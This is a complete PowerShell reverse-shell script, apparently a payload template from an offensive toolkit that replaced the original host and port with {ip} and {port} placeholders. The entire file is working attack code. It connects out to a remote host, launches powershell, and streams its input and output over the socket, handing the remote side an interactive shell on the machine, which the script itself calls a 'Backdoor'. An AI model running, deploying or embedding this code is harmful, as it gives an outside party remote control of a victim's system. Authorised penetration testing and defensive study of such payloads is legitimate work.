# MIT License — Copyright (c) 2019 Ivan Šincek (https://github.com/ivan-sincek/powershell-reverse-tcp).
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# SlingSh0t change: the host and port literals were replaced by the {ip} and {port} placeholders.
# Requires .Net v4.5 or greater.
Write-Host "PowerShell Reverse TCP v5.0 by Ivan Sincek.";
Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
try {
	# change the host address and/or port number as necessary
	$client = New-Object Net.Sockets.TcpClient("{ip}", {port});
	$stream = $client.GetStream();
	$process = New-Object Diagnostics.Process;
	# change the process to run as necessary
	$process.StartInfo.FileName = "powershell";
	$process.StartInfo.UseShellExecute = $false;
	$process.StartInfo.RedirectStandardInput = $true;
	$process.StartInfo.RedirectStandardOutput = $true;
	$process.StartInfo.RedirectStandardError = $true;
	[void]$process.Start();
	Write-Host "Backdoor is up and running...";
	if (!$process.HasExited) {
		$bytes = [Text.Encoding]::UTF8.GetBytes("SOCKET: Shell has connected! PID: $($process.Id)`n");
		$stream.Write($bytes, 0, $bytes.Length);
		$tasks = @(
			$stream.CopyToAsync($process.StandardInput.BaseStream, 1024);
			$process.StandardOutput.BaseStream.CopyToAsync($stream, 1024);
			$process.StandardError.BaseStream.CopyToAsync($stream, 1024);
		);
		[void][Threading.Tasks.Task]::WaitAny($tasks);
	}
	Write-Host "Backdoor will now exit...";
} catch {
	Write-Host "ERROR: $($_.Exception.Message)";
} finally {
	if ($process) {
		$process.Close();
		$process.Dispose();
		Clear-Variable "process";
	}
	if ($stream) {
		$stream.Close();
		$stream.Dispose();
		Clear-Variable "stream";
	}
	if ($client) {
		$client.Close();
		$client.Dispose();
		Clear-Variable "client";
	}
	[GC]::Collect();
}
